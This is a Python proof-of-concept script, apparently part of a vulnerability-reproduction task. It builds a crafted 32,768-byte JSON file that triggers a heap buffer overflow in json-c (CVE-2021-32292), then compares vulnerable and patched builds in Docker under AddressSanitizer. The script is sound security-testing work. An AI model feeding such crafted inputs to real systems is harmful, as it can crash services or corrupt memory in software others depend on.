import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC to trigger heap buffer overflow...")
    
    # El bug ocurre cuando start_pos + parse_end >= sizeof(buf)
    # buf es de 32768 bytes
    # Necesitamos que el error ocurra exactamente en el byte 32768
    
    # Formato: {"a":"AAA...\x01
    # donde \x01 es un carácter de control inválido en posición 32768
    
    prefix = b'{"a":"'
    suffix = b'\x01'
    
    # Total debe ser 32768 para que el último byte cause el error
    # y start_pos + parse_end apunte fuera del buffer
    padding_length = 32768 - len(prefix) - len(suffix)
    
    payload = prefix + (b'A' * padding_length) + suffix
    
    if len(payload) != 32768:
        print(f"ERROR: Payload is {len(payload)} bytes, expected 32768")
        sys.exit(1)
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    print(f"    Created manual_seed.json ({len(payload)} bytes)")
    print(f"    First 10 bytes: {payload[:10]}")
    print(f"    Last 10 bytes: {payload[-10:]}")

def run_test(service_name):
    print(f"\n[*] Testing {service_name}...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    code = result.returncode
    
    # Check for ASan detection
    if "heap-buffer-overflow" in result.stderr or "AddressSanitizer" in result.stderr:
        print("    🔍 AddressSanitizer detected heap-buffer-overflow!")
        # Show relevant lines
        for line in result.stderr.split('\n'):
            if 'heap-buffer-overflow' in line or 'READ of size' in line or 'json_parse.c' in line:
                print(f"    {line}")
    
    if result.stdout:
        stdout_preview = result.stdout[:200]
        print(f"    STDOUT: {stdout_preview}")
    
    icon = "❓"
    if code == 1 and "AddressSanitizer" in result.stderr:
        icon = "💥 ASAN DETECTED OVERFLOW"
    elif code == 139:
        icon = "💥 SEGFAULT"
    elif code == 0:
        icon = "✅ OK"
    elif code == 1:
        icon = "⚠️  ERROR"
    
    print(f"    Exit Code: {code}  {icon}")
    return code, result.stderr

def main():
    generate_poc()
    
    print("\n=== Building containers with AddressSanitizer ===")
    subprocess.run([
        "docker", "compose",
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "build", "--no-cache"
    ])
    
    print("\n=== Testing with AddressSanitizer ===")
    
    code_vuln, stderr_vuln = run_test("target-vuln")
    code_fixed, stderr_fixed = run_test("target-fixed")
    
    print("\n=== RESULTS ===")
    
    vuln_detected = "AddressSanitizer" in stderr_vuln and "heap-buffer-overflow" in stderr_vuln
    fixed_ok = "AddressSanitizer" not in stderr_fixed or "heap-buffer-overflow" not in stderr_fixed
    
    success = vuln_detected and fixed_ok
    
    if success:
        print("✅ SUCCESS!")
        print("   - Vulnerable version: ASan detected heap-buffer-overflow")
        print("   - Fixed version: No overflow detected")
    elif not vuln_detected:
        print("❌ FAIL: ASan did not detect overflow in vulnerable version")
        print("   The PoC may not be triggering the vulnerable code path")
    elif not fixed_ok:
        print("❌ FAIL: Fixed version also shows overflow")
        print("   The fix may not be effective")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()